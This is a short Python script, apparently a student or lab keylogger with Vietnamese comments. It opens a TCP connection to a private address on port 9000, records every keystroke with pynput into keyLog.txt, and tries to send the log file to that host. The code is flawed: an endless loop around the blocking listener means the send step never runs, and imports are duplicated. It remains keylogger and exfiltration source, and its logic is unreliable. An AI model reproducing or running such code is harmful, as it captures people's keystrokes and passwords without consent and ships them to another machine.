from pynput.keyboard import Listener
import logging
import threading, subprocess, socket, argparse, sys

import socket

import socket

# Tạo một socket TCP
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Kết nối đến server
server_address = ('192.168.159.129', 9000)
client_socket.connect(server_address)
filename = 'keyLog.txt'

while True:
	#log_dir = r"C:\Users\hoang\Documents\KeyLogger"
	logging.basicConfig(filename = ("keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
	def on_press(key):
  		logging.info(str(key))
	with Listener(on_press=on_press) as listener:
  		listener.join()
  		
with open(filename, 'r') as f:
  file_content = f.read()
client_socket.sendall(file_content.encode())
  		
		
  

